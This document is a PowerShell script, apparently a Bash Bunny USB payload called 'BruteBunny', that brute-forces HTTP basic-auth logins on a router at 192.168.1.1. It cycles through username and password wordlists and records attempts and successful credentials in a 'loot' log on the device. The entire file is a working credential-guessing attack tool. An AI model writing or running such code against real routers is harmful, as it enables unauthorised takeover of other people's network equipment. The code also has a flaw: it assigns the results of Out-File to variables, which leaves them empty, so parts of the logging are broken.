<#

.SYNOPSIS
BruteBunny 1.0

.AUTHOR
Decoy. Thanks to nishang for original script inspiration.

.DESCRIPTION
This script is designed to Brute Force common usernames/passwords for the router (http basic authentication)

#>

$Protocol = "http"
$Hostname = "192.168.1.1"
$Port = 80
$Bunny = (gwmi win32_volume -f 'label="BashBunny"' | Select-Object -ExpandProperty DriveLetter)
$UsernameList = $Bunny+"\BruteBunny\wordlists\usernames.txt"
$PasswordList = $Bunny+"\BruteBunny\wordlists\passwords.txt"
$StopOnSuccess = $true

$url = $Protocol + "://" + $Hostname + ":" + $Port + "/"
  
  
# Read in lists for usernames and passwords
$Usernames = Get-Content $UsernameList
$Passwords = Get-Content $PasswordList
  
# Does a depth first loop over usernames first, trying every password for each username sequentially in the list
:UNLoop foreach ($Username in $Usernames)
{
  # Loops through passwords in the list sequentially
  foreach ($Password in $Passwords)
  {
    # Starts a new web client
    $WebClient = New-Object Net.WebClient
    # Sets basic authentication credentials for web client
    $SecurePassword = ConvertTo-SecureString -AsPlainText -String $Password -Force
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
    $WebClient.Credentials = $Credential
    Try
    {
      # Prints the target
      $url | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
      # Prints the credentials being tested
      $message = "Checking $Username : $Password" | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
      $message | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
      $content = $webClient.DownloadString($url) | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
      # Continues on to print succesful credentials
      $success = $true 
      #$success
      if ($success -eq $true)
      {
        # Prints succesful auths to highlight legit creds
        $message = "[*] Match found! $Username : $Password" | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
        $message | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
        $content | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
        if ($StopOnSuccess)
        {
          break UNLoop
        }
      }
    }
    Catch
    {
      # Print any error we receive
      $success = $false
      $message = $error[0].ToString() | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
      $message | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
    }
  }
}